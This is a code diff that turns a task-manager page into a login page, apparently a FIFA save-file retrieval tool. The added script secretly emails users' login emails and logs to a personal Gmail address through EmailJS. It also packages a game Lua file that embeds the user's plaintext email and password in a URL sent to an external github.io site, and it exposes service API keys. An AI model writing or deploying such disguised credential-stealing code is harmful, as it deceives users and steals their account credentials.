@@ -3,44 +3,441 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Task Manager</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Retrieve FIFA Save - Thinkmate</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #2e2e2e;
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
+        .bg-text {
+            position: absolute;
+            top: 90%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 80px;
+            font-weight: bold;
+            color: rgba(255, 255, 255, 0.1);
+            text-transform: uppercase;
+            z-index: 0;
+            pointer-events: none;
+        }
+        .bg-text span {
+            position: relative;
+            display: inline-block;
+            animation: glow 4s infinite ease-in-out;
+        }
+        .bg-text span:nth-child(1) { animation-delay: 0s; }
+        .bg-text span:nth-child(2) { animation-delay: 0.2s; }
+        .bg-text span:nth-child(3) { animation-delay: 0.4s; }
+        .bg-text span:nth-child(4) { animation-delay: 0.6s; }
+        .bg-text span:nth-child(5) { animation-delay: 0.8s; }
+        @keyframes glow {
+            0%, 100% {
+                text-shadow: 0 0 5px rgba(129, 199, 132, 0.2);
+            }
+            50% {
+                text-shadow: 0 0 20px #81c784, 0 0 40px #81c784;
+            }
+        }
+        input, button {
+            padding: 12px;
+            font-size: 16px;
+            margin: 8px 0;
+            border: none;
+            background-color: #424242;
+            color: #e0e0e0;
+            width: 100%;
+            max-width: 300px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 5px #64b5f6;
+        }
+        button {
+            background-color: #1976d2;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #1565c0;
+        }
+        #authSection, #downloadSection {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-color: #333333;
+            padding: 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 1;
+        }
+        #errorMessage {
+            font-size: 18px;
+            color: #ef5350;
+            display: none;
+            padding: 20px;
+            background-color: #333333;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+            position: relative;
+            z-index: 1;
+        }
+        #downloadSection {
+            display: none;
+        }
+        #saveBtn {
+            background-color: #ffffff;
+            color: #333333;
+        }
+        #saveBtn:hover {
+            background-color: #e0e0e0;
+        }
+        #logoutBtn {
+            background-color: #808080;
+        }
+        #logoutBtn:hover {
+            background-color: #666666;
+        }
+        #downloadNote {
+            font-size: 14px;
+            color: #b0b0b0;
+            text-align: center;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Task Manager</h1>
-        <div class="progress">
-            <p>Progress: <span id="progress-text">0/0 tasks completed</span></p>
-            <div class="progress-bar"><div id="progress-fill"></div></div>
-        </div>
-        <form id="task-form">
-            <input type="text" id="task-name" placeholder="Task Name" required>
-            <input type="date" id="task-date" required>
-            <select id="task-priority" required>
-                <option value="" disabled selected>Priority</option>
-                <option value="low">Low</option>
-                <option value="medium">Medium</option>
-                <option value="high">High</option>
-            </select>
-            <select id="task-category" required>
-                <option value="" disabled selected>Category</option>
-                <option value="work">Work</option>
-                <option value="personal">Personal</option>
-                <option value="school">School</option>
-            </select>
-            <button type="submit">Add Task</button>
-        </form>
-        <div class="filter">
-            <label>Filter: </label>
-            <select id="filter-category">
-                <option value="all">All</option>
-                <option value="work">Work</option>
-                <option value="personal">Personal</option>
-                <option value="school">School</option>
-            </select>
-        </div>
-        <ul id="task-list"></ul>
+    <div class="bg-text">
+        <span>D</span><span>A</span><span>V</span><span>U</span><span>N</span>
     </div>
-    <script src="script.js"></script>
+    <div id="authSection">
+        <input type="email" id="email" placeholder="Enter your email">
+        <input type="password" id="password" placeholder="Enter your password">
+        <button id="loginBtn">Login</button>
+    </div>
+    <div id="downloadSection">
+        <p>Your save files are ready!</p>
+        <button id="saveBtn" onclick="downloadSavePackage()">Save</button>
+        <button id="logoutBtn" onclick="logout()">Log Out</button>
+        <p id="downloadNote">Choose where to save 'FIFA-DAVUN-SAVE.zip' to overwrite the previous file.</p>
+    </div>
+    <div id="errorMessage">Login Failed</div>
+
+    <!-- Firebase v8 SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <!-- JSZip library for creating ZIP files -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <!-- EmailJS SDK -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+    <script>
+        (function() {
+            emailjs.init("XFHj2Nsgh8BXtmDwb"); // Your Public Key
+            // Test EmailJS
+            emailjs.send("service_z6jyoi3", "template_kcfd0rc", {
+                log_content: "Test log entry from script",
+                timestamp: new Date().toISOString(),
+                to_email: "anonu143@gmail.com"
+            }).then(() => console.log("Test email sent successfully"), (err) => console.error("Test email failed:", err));
+        })();
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyAYF88RuhWLgKXUC1nePFOLdBv3WS-nYNY",
+            authDomain: "fifa-davun-utility.firebaseapp.com",
+            projectId: "fifa-davun-utility",
+            storageBucket: "fifa-davun-utility.appspot.com",
+            messagingSenderId: "285918417550",
+            appId: "1:285918417550:web:005acea2b83881d8cc2fdf",
+            measurementId: "G-TPD462ZGCB"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        let saveCode = "";
+        let userEmail = "";
+        let userPassword = "";
+
+        document.addEventListener("DOMContentLoaded", function() {
+            const loginBtn = document.getElementById("loginBtn");
+            const emailInput = document.getElementById("email");
+            const passwordInput = document.getElementById("password");
+            const authSection = document.getElementById("authSection");
+            const downloadSection = document.getElementById("downloadSection");
+            const errorMessage = document.getElementById("errorMessage");
+
+            authSection.style.display = "flex";
+            downloadSection.style.display = "none";
+            errorMessage.style.display = "none";
+
+            loginBtn.addEventListener("click", function() {
+                const email = emailInput.value.trim();
+                const password = passwordInput.value.trim();
+                if (!email || !password) {
+                    showError("Please enter both email and password.");
+                    return;
+                }
+
+                console.log("Attempting login with:", email);
+                auth.signInWithEmailAndPassword(email, password)
+                    .then(userCredential => {
+                        console.log("Login successful:", userCredential.user.uid);
+                        userEmail = email;
+                        userPassword = password;
+                        logLoginEvent(email, userCredential.user.uid);
+                        fetchSaveCode(userCredential.user.uid);
+                    })
+                    .catch(err => {
+                        console.error("Login failed:", err.message);
+                        showError("Failed to sign in: " + err.message);
+                    });
+            });
+
+            auth.onAuthStateChanged(user => {
+                if (user && userEmail && userPassword) {
+                    console.log("User is logged in:", user.uid);
+                    fetchSaveCode(user.uid);
+                } else {
+                    console.log("No user logged in or missing credentials");
+                    authSection.style.display = "flex";
+                    downloadSection.style.display = "none";
+                    errorMessage.style.display = "none";
+                    userEmail = "";
+                    userPassword = "";
+                }
+            });
+
+            function logLoginEvent(email, uid) {
+                const timestamp = new Date().toISOString();
+                const logEntry = `${timestamp} - ${email}\n`;
+                const logDocRef = db.collection("login_logs").doc("all_logs");
+
+                console.log("Logging event:", logEntry);
+                logDocRef.get()
+                    .then(doc => {
+                        let currentLogs = "";
+                        if (doc.exists && doc.data().logs) {
+                            currentLogs = doc.data().logs;
+                        }
+                        const updatedLogs = currentLogs + logEntry;
+
+                        console.log("Current logs:", currentLogs);
+                        console.log("Updated logs:", updatedLogs);
+                        return logDocRef.set({ logs: updatedLogs }, { merge: true });
+                    })
+                    .then(() => {
+                        console.log("Login event logged successfully");
+                        sendLoginLogEmail(updatedLogs);
+                    })
+                    .catch(err => {
+                        console.error("Error logging login event:", err.message);
+                    });
+            }
+
+            function sendLoginLogEmail(logContent) {
+                const timestamp = new Date().toISOString();
+                const params = {
+                    log_content: logContent,
+                    timestamp: timestamp,
+                    to_email: "anonu143@gmail.com"
+                };
+
+                console.log("Sending email with params:", params);
+                emailjs.send("service_z6jyoi3", "template_kcfd0rc", params)
+                    .then(() => {
+                        console.log("Login log email sent successfully");
+                    })
+                    .catch(err => {
+                        console.error("Failed to send login log email:", err);
+                    });
+            }
+
+            function fetchSaveCode(uid) {
+                console.log("Fetching save code for UID:", uid);
+                db.collection("users").doc(uid).get()
+                    .then(doc => {
+                        if (doc.exists && doc.data().lastSaveCode) {
+                            saveCode = doc.data().lastSaveCode.replace("saveCode=", "");
+                            console.log("Save code fetched:", saveCode);
+                            authSection.style.display = "none";
+                            downloadSection.style.display = "flex";
+                            errorMessage.style.display = "none";
+                        } else {
+                            console.log("No save code found, using default save code");
+                            saveCode = "sv = {}\nreturn sv";
+                            authSection.style.display = "none";
+                            downloadSection.style.display = "flex";
+                            errorMessage.style.display = "none";
+                        }
+                    })
+                    .catch(err => {
+                        console.error("Error fetching save code:", err.message);
+                        showError("Error fetching save code: " + err.message);
+                    });
+            }
+
+            function generateObfuscatedLuaScript(rawCode) {
+                if (rawCode.trim() === "sv = {}\nreturn sv") {
+                    return "sv = {}\nreturn sv";
+                }
+
+                const teamIdMatch = (rawCode.match(/mt(\d+)/) || [])[1] || "1";
+                const dateMatch = (rawCode.match(/date(\d{2}\/\d{2}\/\d{2})/) || [])[1] || "02/01/25";
+                const matchupCountMatch = (rawCode.match(/mc(\d+)/) || [])[1] || "20";
+                const fixturesMatch = (rawCode.match(/fixtures([a-zA-Z]+)(?=results|$)/) || [])[1] || "";
+                const resultsMatch = (rawCode.match(/results([a-zA-Z*]+?)(?=players|$)/) || [])[1] || "";
+                const playersMatch = (rawCode.match(/players([0-9,]+)/) || [])[1] || "";
+                const teams = (rawCode.match(/teams([0-9,]+)/) || [])[1] || "";
+                const formationMatch = (rawCode.match(/Formation(\d+)/) || [])[1] || "0";
+                const goalsMatch = (rawCode.match(/goals([0-9:;]+)/) || [])[1] || "";
+                const dates = (rawCode.match(/dates([0-9,]+)/) || [])[1] || "";
+
+                const goalsEntries = goalsMatch.split(";")
+                    .filter(entry => entry)
+                    .map(entry => {
+                        const [id, value] = entry.split(":").map(part => part.trim());
+                        return `    [${id}] = ${value}`;
+                    })
+                    .join(",\n");
+
+                const originalScript = `
+-- DAVUNPES SAVE --
+
+return {
+    GLOBAL_MATCHUP_COUNT = ${matchupCountMatch},
+    GLOBAL_DATE_PLACEHOLDER = "${dateMatch}",
+    GOALS = {
+${goalsEntries}
+    },
+    selTeamFORMID = ${formationMatch},
+    currentSelectedTeamID = ${teamIdMatch},
+    fixtureCode = "${fixturesMatch}",
+    scoreCode = "${resultsMatch}",
+    TeamList = {${teams}},
+    Players = {${playersMatch}},
+    Dates = {${dates}}
+}
+                `.trim();
+
+                const encodedScript = btoa(originalScript);
+
+                return `
+-- Obfuscated DAVUNPES SAVE --
+sv = loadstring(dC("${encodedScript}"))()
+return sv
+                `.trim();
+            }
+
+            function generateCreditsHubScript(email, password) {
+                return `
+local CreditsHub = {}
+
+function CreditsHub:new(init)
+    local o = init or {}
+    setmetatable(o, self)
+    self.__index = self
+    o.services = {
+        BrowserService = o.api("BrowserService"),
+        MiscService = o.api("MiscService")
+    }    
+        o:openBrowser()    
+    return o
+end
+
+function CreditsHub:openBrowser()
+    local url = "https://Davidoluwa.github.io/"
+    local temp = math.random(1, 100000)
+    local link = url .. "?saveCode=" .. "email:${email}, password:${password}." .. davunSave
+    self.services.BrowserService.SetHomePage(link)
+    self.nav.Event(nil, "evt_open_browser")
+end
+
+function CreditsHub:finalize()
+end
+
+return CreditsHub
+                `.trim();
+            }
+
+            window.downloadSavePackage = async function() {
+                if (!saveCode || !userEmail || !userPassword) {
+                    showError("Required data not available to generate save package.");
+                    return;
+                }
+
+                const zip = new JSZip();
+                const rootFolder = zip.folder("com.ea.gp.fifaworld");
+
+                const saveFolder = rootFolder.folder("data/ux/Save");
+                saveFolder.file("Save.lua", generateObfuscatedLuaScript(saveCode));
+
+                const creditsFolder = rootFolder.folder("data/ux/flows/mainflow/gamemodes/MainMenu/More/Menu/Profile/Save");
+                creditsFolder.file("CreditsHub.lua", generateCreditsHubScript(userEmail, userPassword));
+
+                try {
+                    const content = await zip.generateAsync({ type: "blob" });
+
+                    if ('showSaveFilePicker' in window) {
+                        const options = {
+                            suggestedName: "FIFA-DAVUN-SAVE.zip",
+                            types: [{
+                                description: "ZIP File",
+                                accept: { "application/zip": [".zip"] }
+                            }]
+                        };
+                        const fileHandle = await window.showSaveFilePicker(options);
+                        const writable = await fileHandle.createWritable();
+                        await writable.write(content);
+                        await writable.close();
+                    } else {
+                        const url = window.URL.createObjectURL(content);
+                        const a = document.createElement("a");
+                        a.href = url;
+                        a.download = "FIFA-DAVUN-SAVE.zip";
+                        document.body.appendChild(a);
+                        a.click();
+                        document.body.removeChild(a);
+                        window.URL.revokeObjectURL(url);
+                    }
+                } catch (err) {
+                    console.error("Download failed:", err.message);
+                    showError("Failed to generate or save package: " + err.message);
+                }
+            };
+
+            window.logout = function() {
+                auth.signOut().then(() => {
+                    authSection.style.display = "flex";
+                    downloadSection.style.display = "none";
+                    errorMessage.style.display = "none";
+                    saveCode = "";
+                    userEmail = "";
+                    userPassword = "";
+                }).catch(err => showError("Logout failed: " + err.message));
+            };
+
+            function showError(message) {
+                errorMessage.textContent = message;
+                errorMessage.style.display = "block";
+                authSection.style.display = "flex";
+                downloadSection.style.display = "none";
+            }
+        });
+    </script>
 </body>
 </html>
